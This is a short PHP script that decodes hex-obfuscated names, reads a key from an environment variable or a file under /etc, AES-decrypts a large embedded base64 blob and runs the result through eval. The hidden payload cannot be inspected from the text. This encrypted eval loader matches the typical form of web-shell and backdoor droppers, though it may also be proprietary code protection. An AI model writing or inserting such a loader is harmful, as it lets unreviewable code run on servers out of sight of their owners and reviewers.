<?php

$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('z2Lq2HUnB2Pi/7/0OEscOA==');

$c=base64_decode(

'U/tE4eEo76Vml/p6QZox8x+nKlAU/j3ysIS1oFYrwT2jI9qNUCUQxROX/K8L/6KIkCZlAfx6Cbi0' .
'gU+uivs/38ujkaezy95NjqErZ7sRT/5VudsuU5zmNpH3Ok7DBs3Bcore303X8sqL5DeN+YrYruH4' .
'wp3YMC8V7rKWbMGd3rypaeMDm1dpGvgvszVJRp9lSkVd5BN1tCu5h5Bj1am29FJh3XmAOuMApLae' .
'xnsO5Z+9mEAB3dIFGQEzwIkjQm0X9i4I/IdT3QAjwSj65GQT6FBhISO1gjitmOnQvxlqr6DJcg8h' .
'4Pogua1mQF9RdrtKZ4qxFv3vDsOfqyMG4PcMTSS0QG3Ah78XoswFauwJFVbwlFXKHMCz5jBglggO' .
'47HgYXq1JA+9QHjoLt0/KotAy5JES0AghD61TW0brv9MdQWE3bNftqLjF0WsmwOXjrQm2IpZgHe8' .
'IzGvGFnlzSE92ZINSN+onR0Oz+paxOPbgwjmRtAfBD5R98PK+9PwCtxPuVY8kM46UQp+nJ5J/52b' .
'BGSelXLbfVHpe3qk4PUH1y/mXv481gBWGorzkcLs6p5naZ62tXuqWLqj59e0KfYYw3Sip37INAmN' .
'A7uh+Ul+CzJxOuiIufLlhPC+vA5hdNwLv+wgEedJbMidDHRxiRq9AwcwXiMkjJniuA/d49Svvx5l' .
'QvJImYcU/TvBadHgkV1m7Su3Yoe2znOOGl0mQAHsWtWLcaHIsumEMjKPIFFk8zu6CXK8/8MRNCCi' .
'KgNPLAjQR8nwRc/ENEQPe5YB8+yqfzdxbk6Y0JuY1ddo4PSNqBlezcZNTqXjkqDi2ZNIzA+cR6Ts' .
'+xI/dkbgmUqXG+fxekt24O8+m3j2jQdcDNOoJKc3lohhfaodYW0db5QXKOpQ2HrS6s8rTRGbuory' .
'gJxhgpOs+FfYeLSx5p4ZD1MSGpHZtoCF68cRVo1psHLfkXraRMk8xXk/LUUOKS6lIFuL4k5zdVN2' .
'ycFcTo9ZMjA5uCMhNQ2ghjo4iIqJAvcujaWZFY+cde8AIl780B8jr4MY2Ifls0K9nWqfwRZbWiTl' .
'XLG2bJtUYSeE1z3v0Nuxh7ho3R6XBSsAHVrere8Wxby0TdLmsRhx7NzSIurNaCgDF7bf4yLVZwtj' .
'AMCfQLJImx2Q6XC81ua5Ked32Kp3VDz0228Y3ON4p9Y+VFj4ObdQp488ZsH09AVVRFeXDxKq6Dtx' .
'OZhvtnc/eYF0YZOkdnLJA9V6qFqiuAS5EXbJkcF2mu2MsDHFYyX0YLoRbYM4+HC3o0uIttjHphkR' .
'rNayY/F2shT91rZC++Q+B28+pc8+xzKoQRH2/Uq42DrH4DHMP1Mlbi09690FGVbgGih/aPdgLpTe' .
'Ysc1iSJnkGwGIEGbnTPRt3glQBOiU7A7d9a7rQP7U69blkIvkjyfLWlEkgS74DA1K6ZjsnramDSR' .
'jtQoGD35/HS0tIcwv8nKsD5WVPcwjidiXtP56RTK1cAdfdIUaoBF+4Jmei+YtA6+JHeDzN7AhX5H' .
'pNpI6+2zZPO015YBL7q2tjzi0fo2u3jUXFy5e1V5PNhSg3LAjJFUCzPR2kg219FxnSBSwfmLyqCF' .
'xlAr8ehI3/S/u5n5RsbEvfN5WQ4C2oY/cWGozCx8plHQ74BpU9PC1EZb+rlwzp+mDPGTNo48mZ+f' .
'vXgYwPMbhQz1n2PyJs4fZMoMLnsyvXdi0fNRWYr41bnyixlPkMTxRp/J7Ao0cXSW159u9jZ3bzmi' .
'tix4mqMVSMTJeCk7QuFEOsLqd2lcZwprqUOVuQiulvjqpC/EDOlUqdE59oEkacuGBMTKn6fGuAM5' .
'p2Nh+/BLWj8ZP/ZGaesFeCmiiECWTJRBoCuZU6NvVY6QLJE01andLTWcL953RgNVRjBWOYXHiDrI' .
'FtJ8RGrxi07mpueTKxsI7e5UEM2kvOwKOTsTfDPJ2gMbh2bIBwy8Kp2jqOXgdj5mVfAcmEvwOBic' .
'Z3pmRR7jo4l9WVz3qWNvhU95rnVeypJh3nLEDP4g/D3H5iRX8D6EzE4qS13cwb1bqFE4D9qGeBdn' .
'k7cAVQb9XYJIukpz/jaDqu9AROgTKUU6hQRStPxjwrCiUzBYG7BlmMUU9NpluCnOWY6UMnvYQVtm' .
'bDVRUoIZd545lKzzjP63czMuNCLTxvoWcLKFl5cfclFr58x6yFwM31GxDgZY5UF4EBsmGtrkPemn' .
'uDQSRo8vLckaxe7s43bKpv1h1rAC4pukgo1JiFx0JR3itIIKaTTtx2zYXUBxUW21CH2jKOlNdspY' .
'nmzp7ZBrEbedNTv/dhtM7gMYAMLIAJxEF6HEMSbpqsgRNfJICworWAUHFdOoP0V/lnqQQtsrw4DT' .
'XfrSMTTV7qnGMB8dIg18QuPNTD4IOL6oUw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval('?>'.$d);

